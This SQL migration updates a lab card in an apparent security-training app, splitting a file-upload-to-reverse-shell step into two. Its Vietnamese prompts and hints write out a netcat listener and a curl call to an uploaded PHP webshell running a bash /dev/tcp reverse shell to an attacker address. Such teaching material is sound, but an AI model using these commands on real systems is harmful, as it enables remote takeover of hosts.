-- 0033: Assignment 3's last step asked the learner to do TWO things (open a
-- listener, then call the webshell) but accepted either one alone (OR'd
-- patterns) as "done" -- so typing just the simpler listener command
-- ("nc -nvlp 4444") marked the whole step correct without ever typing the
-- actual exploit command. Split it into two separate steps so both are
-- actually practiced.
UPDATE cards
SET payload = jsonb_set(
  payload,
  '{steps}',
  (
    (payload->'steps') - (jsonb_array_length(payload->'steps') - 1)
  ) || '[
    {"prompt": "Mở sẵn listener netcat cổng 4444 trên máy attacker, chờ reverse shell.", "hint": "nc -nvlp 4444", "type": "command", "patterns": ["nc\\s+-nvlp\\s+4444"], "explanation": "Luôn mở listener TRƯỚC khi trigger payload — nếu không kết nối reverse shell sẽ bị từ chối ngay khi victim thử kết nối về. Mẹo nhớ: n = no DNS, v = verbose, l = listen, p = port."},
    {"prompt": "Gọi webshell vừa upload (shell.phtml) với tham số cmd chạy lệnh reverse-shell bash về máy attacker (10.10.14.5:4444).", "hint": "curl \"http://10.10.20.35/uploads/shell.phtml?cmd=bash -i >%26 /dev/tcp/10.10.14.5/4444 0>%261\"", "type": "command", "patterns": ["curl\\s+.?http://10\\.10\\.20\\.35/uploads/shell\\.phtml\\?cmd=.*bash.*dev/tcp/10\\.10\\.14\\.5/4444.?"], "explanation": "Gọi tham số cmd của webshell với lệnh reverse-shell bash tiêu chuẩn — URL-encode dấu & (>%26) vì nó có ý nghĩa đặc biệt trong URL."}
  ]'::jsonb,
  true
)
WHERE kind = 'lab' AND front = 'Assignment 3 — File upload vulnerability đến reverse shell';
